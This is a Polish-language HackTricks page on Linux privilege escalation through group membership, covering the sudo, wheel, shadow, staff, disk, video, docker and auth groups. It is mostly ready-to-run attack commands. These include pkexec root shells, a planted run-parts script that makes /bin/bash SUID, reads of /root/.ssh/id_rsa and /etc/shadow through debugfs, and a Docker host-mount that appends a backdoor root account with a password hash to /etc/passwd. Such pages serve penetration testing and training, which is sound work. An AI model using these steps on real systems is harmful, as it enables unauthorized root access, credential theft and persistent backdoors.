# Interesujące Grupy - Eskalacja Uprawnień w Linuxie

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Grupy Sudo/Administratorów

### **PE - Metoda 1**

**Czasami**, **domyślnie (lub z powodu potrzeb niektórego oprogramowania)** w pliku **/etc/sudoers** można znaleźć niektóre z tych linii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik należący do grupy sudo lub admin może wykonać cokolwiek jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```
sudo su
```
### PE - Metoda 2

Znajdź wszystkie binarne pliki suid i sprawdź, czy istnieje binarny plik **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli okaże się, że binarny **pkexec jest binarnym SUID** i należysz do grupy **sudo** lub **admin**, prawdopodobnie będziesz mógł wykonywać binarne pliki jako sudo za pomocą `pkexec`.\
Dzieje się tak, ponieważ zazwyczaj te grupy są wewnątrz **polityki polkit**. Ta polityka określa, które grupy mogą korzystać z `pkexec`. Sprawdź to za pomocą:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
W pliku znajdziesz, które grupy mają uprawnienia do wykonania **pkexec** i **domyślnie** w niektórych dystrybucjach Linuxa grupy **sudo** i **admin** są wymienione.

Aby **stać się rootem, możesz wykonać**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Jeśli spróbujesz uruchomić **pkexec** i otrzymasz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś podłączony bez GUI**. Istnieje sposób na obejście tego problemu tutaj: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różne sesje ssh**:

{% code title="sesja1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="sesja2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Grupa Wheel

**Czasami**, **domyślnie** w pliku **/etc/sudoers** można znaleźć tę linię:
```
%wheel	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik należący do grupy wheel może wykonać cokolwiek jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```
sudo su
```
## Grupa Shadow

Użytkownicy z **grupy shadow** mogą **czytać** plik **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Więc przeczytaj plik i spróbuj **złamać kilka hashy**.

## Grupa Personelu

**personel**: Umożliwia użytkownikom dodawanie lokalnych modyfikacji do systemu (`/usr/local`) bez konieczności posiadania uprawnień roota (zauważ, że pliki wykonywalne w `/usr/local/bin` są w zmiennej PATH każdego użytkownika i mogą "nadpisać" pliki wykonywalne w `/bin` i `/usr/bin` o tej samej nazwie). Porównaj z grupą "adm", która bardziej dotyczy monitorowania/bezpieczeństwa. [\[źródło\]](https://wiki.debian.org/SystemGroups)

W dystrybucjach debian, zmienna `$PATH` pokazuje, że `/usr/local/` będzie uruchamiany jako najwyższy priorytet, niezależnie od tego, czy jesteś uprzywilejowanym użytkownikiem, czy nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Jeśli uda nam się przejąć kontrolę nad niektórymi programami w `/usr/local`, łatwo uzyskamy uprawnienia roota.

Przejęcie kontroli nad programem `run-parts` jest prostym sposobem na uzyskanie uprawnień roota, ponieważ większość programów uruchamia `run-parts` (np. crontab, podczas logowania przez SSH).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
lub gdy nastąpi nowe logowanie sesji ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Wykorzystanie**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupa dyskowa

To uprawnienie jest prawie **równoważne z dostępem roota**, ponieważ umożliwia dostęp do wszystkich danych wewnątrz maszyny.

Pliki: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Zauważ, że używając debugfs możesz również **pisać pliki**. Na przykład, aby skopiować `/tmp/asd1.txt` do `/tmp/asd2.txt`, możesz wykonać:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jednakże, jeśli spróbujesz **zapisać pliki należące do roota** (takie jak `/etc/shadow` lub `/etc/passwd`), otrzymasz błąd "**Permission denied**".

## Grupa Video

Korzystając z polecenia `w`, możesz sprawdzić **kto jest zalogowany w systemie** i otrzymasz wynik podobny do poniższego:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** oznacza, że użytkownik **yossi jest zalogowany fizycznie** do terminala na maszynie.

Grupa **video** ma dostęp do przeglądania wyjścia ekranu. W zasadzie można obserwować ekrany. Aby to zrobić, musisz **przechwycić bieżący obraz na ekranie** w postaci surowych danych i uzyskać rozdzielczość, którą ekran używa. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Aby **otworzyć** **surowy obraz**, możesz użyć **GIMP**, wybierz plik \*\*`screen.raw` \*\* i wybierz jako typ pliku **Dane obrazu surowego**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Następnie zmodyfikuj Szerokość i Wysokość na te używane na ekranie i sprawdź różne Typy obrazu (i wybierz ten, który najlepiej pokazuje ekran):

![](<../../../.gitbook/assets/image (288).png>)

## Grupa Root

Wygląda na to, że domyślnie **członkowie grupy root** mogą mieć dostęp do **modyfikacji** niektórych plików konfiguracyjnych **usługi** lub niektórych plików **bibliotek** lub **innych interesujących rzeczy**, które mogą być wykorzystane do eskalacji uprawnień...

**Sprawdź, które pliki mogą być modyfikowane przez członków root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupa Docker

Możesz **podłączyć system plików root hosta do woluminu instancji**, dzięki czemu po uruchomieniu instancji natychmiast wczytuje `chroot` do tego woluminu. W rezultacie otrzymujesz uprawnienia roota na maszynie.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## Grupa lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Grupa Adm

Zazwyczaj **członkowie** grupy **`adm`** mają uprawnienia do **odczytu plików dziennika** znajdujących się wewnątrz _/var/log/_.\
Dlatego, jeśli skompromitowałeś użytkownika należącego do tej grupy, zdecydowanie powinieneś **przejrzeć dzienniki**.

## Grupa Auth

Wewnątrz OpenBSD grupa **auth** zazwyczaj może zapisywać w folderach _**/etc/skey**_ i _**/var/db/yubikey**_ jeśli są używane.\
Te uprawnienia mogą być nadużyte za pomocą następującego exploitu do **eskalacji uprawnień** do roota: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
